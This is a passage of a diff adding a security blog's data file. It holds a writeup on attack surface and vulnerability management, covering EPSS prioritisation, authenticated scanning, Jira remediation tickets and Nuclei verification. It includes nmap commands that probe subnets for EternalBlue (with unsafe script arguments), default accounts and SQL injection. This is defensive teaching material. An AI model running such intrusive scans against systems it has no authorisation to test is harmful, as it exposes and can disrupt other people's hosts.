+      all_scores.extend(r.json().get("data", []))
+   
+  # Sort by EPSS score and print high-probability vulns
+  sorted_scores = sorted(all_scores, key=lambda x: float(x['epss']), reverse=True)
+   
+  print("\\n=== HIGH EPSS SCORE CVEs (>10% exploitation probability) ===")
+  for item in sorted_scores:
+      epss = float(item['epss'])
+      if epss > 0.10:
+          print(f"  {item['cve']}: EPSS={epss:.4f} ({epss*100:.1f}%) | Percentile={float(item['percentile'])*100:.1f}%")
+   
+  EOF`,
+        },
+      },
+      {
+        heading: "Authenticated vs Unauthenticated Scanning",
+        paragraphs: [
+          "One of the most common mistakes in VM programs is running only unauthenticated scans and wondering why the scanner keeps missing vulnerabilities that the penetration testers find. The gap is real and significant.",
+          "Unauthenticated scanning tests what an external attacker without any credentials can see — open ports, service banners, web application issues accessible without login. Authenticated scanning provides the scanner with credentials to log into systems, allowing it to examine installed software versions, patch levels, local configurations, registry settings, and security configurations that are completely invisible from the outside.",
+          "The difference in finding count between authenticated and unauthenticated scans of the same target can be 10x or more. Running an authenticated scan against a Windows workstation with Nessus, for example, gives you visibility into every installed software package, its version, known CVEs, and patch status — none of which is visible without credentials.",
+        ],
+        code: {
+          language: "bash",
+          label: "Nmap Script Scanning — Authenticated Checks",
+          snippet: `# SMB authenticated enumeration (useful for Windows vulnerability assessment)
+  nmap -p 445 --script smb-vuln-ms17-010,smb-security-mode,smb2-security-mode \\
+    10.0.0.0/24 -oN smb_scan.txt
+   
+  # Check for EternalBlue (MS17-010) specifically
+  nmap -p 445 --script smb-vuln-ms17-010 --script-args unsafe=1 \\
+    10.0.0.0/24
+   
+  # SSH version and algorithm audit
+  nmap -p 22 --script ssh2-enum-algos,ssh-auth-methods \\
+    10.0.0.0/24 -oN ssh_audit.txt
+   
+  # Web application focused authenticated scan
+  nmap -p 80,443,8080,8443 \\
+    --script http-auth,http-default-accounts,http-sql-injection \\
+    targets.txt
+   
+  # Database exposure checks
+  nmap -p 3306,5432,1433,1521,27017 \\
+    --script mysql-info,ms-sql-info,oracle-tns-version,mongodb-info \\
+    10.0.0.0/24 -oN db_exposure.txt
+   
+  # Full vulnerability script category scan (use carefully — some scripts are intrusive)
+  nmap --script vuln -p- -T4 target_ip -oA vuln_scan`,
+        },
+      },
+      {
+        heading: "Remediation: Where Programs Actually Fail",
+        paragraphs: [
+          "Every VM program has a remediation problem. Scanning is easy. Generating a list of vulnerabilities is easy. Getting those vulnerabilities fixed — in the right order, by the right teams, with appropriate urgency — is genuinely hard. It's a people and process problem as much as a technical one.",
+          "The mechanics of remediation tracking matter a lot. If your vulnerability data lives only in your scanner dashboard and your engineering team lives in Jira, nothing will get fixed efficiently. The handoff between 'security identified this vulnerability' and 'engineering remediated this vulnerability' needs to be automated, tracked, and escalated when SLAs are missed.",
+          "SLAs (Service Level Agreements) for remediation should be tiered by severity. A reasonable baseline: Critical vulnerabilities (CVSS 9.0+ or KEV listed) should be remediated or mitigated within 24-72 hours. High severity (CVSS 7.0-8.9) within 14-30 days. Medium severity (CVSS 4.0-6.9) within 60-90 days. Low severity (CVSS < 4.0) within 180 days or managed risk acceptance. These timelines aren't universal — highly regulated industries (healthcare, finance) often have stricter requirements.",
+        ],
+        code: {
+          language: "python",
+          label: "Automated Jira Ticket Creation from Vulnerability Findings",
+          snippet: `#!/usr/bin/env python3
+  """
+  auto_ticket_creator.py
+  Reads Nuclei JSON output, filters by severity,
+  and creates Jira tickets with full vulnerability details.
+  """
+   
+  import json
+  import requests
+  from datetime import datetime, timedelta
+   
+  JIRA_URL = "https://yourcompany.atlassian.net"
+  JIRA_EMAIL = "security@yourcompany.com"
+  JIRA_API_TOKEN = "your_api_token"
+  JIRA_PROJECT = "SEC"
+   
+  SLA_DAYS = {
+      "critical": 3,
+      "high": 14,
+      "medium": 60,
+      "low": 180
+  }
+   
+  PRIORITY_MAP = {
+      "critical": "Highest",
+      "high": "High",
+      "medium": "Medium",
+      "low": "Low"
+  }
+   
+  def create_jira_ticket(finding):
+      severity = finding["info"]["severity"]
+      due_date = datetime.now() + timedelta(days=SLA_DAYS.get(severity, 60))
+      
+      ticket = {
+          "fields": {
+              "project": {"key": JIRA_PROJECT},
+              "summary": f"[VM] {severity.upper()}: {finding['info']['name']} on {finding['host']}",
+              "description": f"""
+  *Vulnerability Details*
+  ----
+  *Name:* {finding['info']['name']}
+  *Severity:* {severity.upper()}
+  *Affected Host:* {finding['host']}
+  *Template ID:* {finding['template-id']}
+  *CVE(s):* {', '.join(finding['info'].get('classification', {}).get('cve-id', ['N/A']))}
+   
+  *Description*
+  {finding['info'].get('description', 'No description available')}
+   
+  *Remediation*
+  {finding['info'].get('remediation', 'See vendor advisory')}
+   
+  *References*
+  {chr(10).join(finding['info'].get('reference', []))}
+   
+  *Evidence*
+  {{code}}
+  Matched at: {finding.get('matched-at', finding['host'])}
+  {json.dumps(finding.get('extracted-results', []), indent=2)}
+  {{code}}
+   
+  *SLA Due Date:* {due_date.strftime('%Y-%m-%d')}
+  *Discovery Date:* {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}
+  """,
+              "issuetype": {"name": "Bug"},
+              "priority": {"name": PRIORITY_MAP.get(severity, "Medium")},
+              "labels": ["vulnerability-management", severity, "asm"],
+              "duedate": due_date.strftime('%Y-%m-%d')
+          }
+      }
+      
+      response = requests.post(
+          f"{JIRA_URL}/rest/api/3/issue",
+          json=ticket,
+          auth=(JIRA_EMAIL, JIRA_API_TOKEN),
+          headers={"Content-Type": "application/json"}
+      )
+      
+      if response.status_code == 201:
+          issue_key = response.json()["key"]
+          print(f"  ✓ Created {issue_key}: {finding['info']['name']} [{severity.upper()}]")
+          return issue_key
+      else:
+          print(f"  ✗ Failed to create ticket: {response.text}")
+          return None
+   
+  # Load nuclei results
+  with open("nuclei_results.json") as f:
+      findings = [json.loads(line) for line in f if line.strip()]
+   
+  # Process critical and high findings only
+  created = 0
+  for finding in findings:
+      if finding.get("info", {}).get("severity") in ["critical", "high"]:
+          create_jira_ticket(finding)
+          created += 1
+   
+  print(f"\\nCreated {created} Jira tickets from {len(findings)} total findings")`,
+        },
+      },
+      {
+        heading: "Verification: Closing the Loop",
+        paragraphs: [
+          "Remediation without verification is just hope. The final stage of the VM lifecycle is confirming that fixes were actually effective — that the patch was applied, the configuration was changed, the vulnerable service was actually taken offline rather than just a ticket being closed.",
+          "Verification can be as simple as re-running the specific Nuclei template that detected the vulnerability against the affected host after the fix is applied. If the template no longer fires, the remediation is confirmed. For more complex vulnerabilities, manual verification by the security team may be necessary.",
+          "Metrics matter too. A healthy VM program tracks mean time to remediate (MTTR) by severity, the percentage of assets scanned vs total asset inventory, vulnerability density trends over time (are you getting better or worse?), SLA compliance rates, and the ratio of new vulnerabilities discovered versus old ones closed. These metrics tell the story of your program's health to leadership in a way that raw finding counts never will.",
+        ],
+        code: {
+          language: "bash",
+          label: "Automated Remediation Verification with Nuclei",
+          snippet: `#!/bin/bash
+  # verify_remediation.sh
+  # Takes a Jira ticket ID and verifies the associated vulnerability is fixed
+   
+  TICKET_ID=$1  # e.g., SEC-1234
+  NUCLEI_TEMPLATE=$2  # e.g., cves/2021/CVE-2021-44228.yaml
+  TARGET=$3  # e.g., https://target.com
+   
+  echo "[*] Verifying remediation for ticket $TICKET_ID"
+  echo "[*] Template: $NUCLEI_TEMPLATE"
+  echo "[*] Target: $TARGET"
+  echo ""
+   
+  # Run targeted nuclei check
+  RESULT=$(nuclei -t $NUCLEI_TEMPLATE -u $TARGET -json -silent 2>/dev/null)
+   
+  if [ -z "$RESULT" ]; then
+      echo "✅ REMEDIATION VERIFIED — Vulnerability no longer detected"
+      echo "   Template: $NUCLEI_TEMPLATE"
+      echo "   Target: $TARGET"
+      echo "   Verified at: $(date -u)"
+      
+      # Auto-close Jira ticket
+      curl -s -X POST \\
+        "https://yourcompany.atlassian.net/rest/api/3/issue/$TICKET_ID/transitions" \\
+        -u "security@yourcompany.com:$JIRA_TOKEN" \\
+        -H "Content-Type: application/json" \\
+        -d '{"transition": {"id": "31"}}' > /dev/null
+      echo "   Jira ticket $TICKET_ID automatically closed"
+  else
+      echo "❌ REMEDIATION FAILED — Vulnerability still present"
+      echo "$RESULT" | jq -r '.matched-at'
+      echo "   Please escalate to the asset owner immediately."
+  fi`,
+        },
+      },
+      {
+        heading: "Integrating ASM and VM: The Full Picture",
+        paragraphs: [
+          "At their best, ASM and VM aren't separate programs — they're a continuous pipeline. ASM continuously discovers and inventories your attack surface. VM continuously assesses that surface for vulnerabilities, prioritises findings based on risk, and tracks remediation. The output of ASM feeds directly into VM, and VM's findings inform which parts of the attack surface need the most attention.",
+          "Here's what that integrated pipeline looks like in practice. ASM detects a new subdomain — dev-api.target.com — on a Tuesday morning. Automated HTTP probing determines it's running an old version of Spring Boot. That finding triggers a targeted Nuclei scan, which detects CVE-2022-22965 (Spring4Shell). The CVE is on the CISA KEV list. An automated Jira ticket is created with critical priority and a 24-hour SLA. An alert fires in the security Slack channel. The developer who owns the service gets paged. By Wednesday morning, the service is patched. Automated verification confirms the fix. The ticket is closed, and the MTTR metric for critical KEV vulnerabilities moves in the right direction.",
+          "That pipeline requires investment — in tooling, in automation, in the integrations that connect your ASM data to your VM data to your ticketing system to your alerting system. But once it's running, it operates largely without manual intervention, freeing your security team to focus on the genuinely hard problems that automation can't solve.",
+        ],
+        image: {
+          url: "https://images.unsplash.com/photo-1573164713988-8665fc963095?w=1100&auto=format&fit=crop&q=80",
+          caption:
+            "An integrated ASM + VM pipeline transforms point-in-time security assessments into a continuously operating risk reduction engine.",
+          alt: "Security operations center with multiple monitors showing network data",
+        },
+      },
+      {
+        heading: "Key Tools Reference",
+        paragraphs: [
+          "Here's a consolidated reference of the tools mentioned throughout this writeup, organised by function.",
+          "Asset Discovery & Recon: Subfinder (passive subdomain enumeration), Amass (comprehensive external enumeration), PureDNS (fast DNS resolution and brute-forcing), crt.sh (certificate transparency log queries), Shodan CLI (internet-wide scan data), Censys (certificate and host intelligence).",
+          "HTTP Probing & Fingerprinting: HTTPX (mass HTTP probing with tech detection), WhatWeb (technology fingerprinting), Wappalyzer CLI (tech stack detection), EyeWitness (web screenshot and categorisation).",
+          "Port Scanning: Masscan (ultra-fast port discovery), Nmap (service detection, script scanning, NSE), Naabu (fast port scanner from Project Discovery).",
+          "Vulnerability Detection: Nuclei (template-based vulnerability scanner), OpenVAS/Greenbone (network vulnerability scanner), Nikto (web server scanner), SQLMap (SQL injection detection and exploitation).",
+          "Cloud Security: CloudEnum (cloud storage enumeration), S3Scanner (AWS S3 bucket misconfiguration), Prowler (AWS/Azure/GCP security auditing), Trivy (container and IaC vulnerability scanning).",
+          "Threat Intelligence: CISA KEV API, FIRST EPSS API, Vulners API, NVD API — these provide the enrichment data that transforms raw findings into prioritised risk.",
+        ],
+      },
+      {
+        heading: "Final Thoughts",
+        paragraphs: [
+          "ASM and VM are not problems you solve. They're processes you run — continuously, consistently, and with discipline. The organisations that do this well aren't necessarily the ones with the biggest budgets or the most advanced tools. They're the ones that understand their own attack surface better than their attackers do, fix high-priority issues faster than attackers can exploit them, and build systems that make the right actions easier than the wrong ones.",
+          "The attacker's workflow is already automated. They're running scanners against your IP ranges every day, monitoring certificate transparency logs for your new subdomains, checking Shodan for newly exposed services. The only way to stay ahead is to match that automation with your own — and add the organisational machinery to actually act on what the automation finds.",
+          "Start simple. Pick one seed domain. Run Subfinder. Feed the output to HTTPX. Feed that to Nuclei with the severity filter set to critical and high only. Cross-reference against the KEV list. Fix what comes out. That's a real ASM+VM program, even if it's running from a cron job on a cheap VPS. Add complexity incrementally as your program matures. The goal isn't a perfect system — it's a system that catches real vulnerabilities before attackers do.",
+        ],
+      },
+    ],
   },
   {
     id: "full-kill-chain",
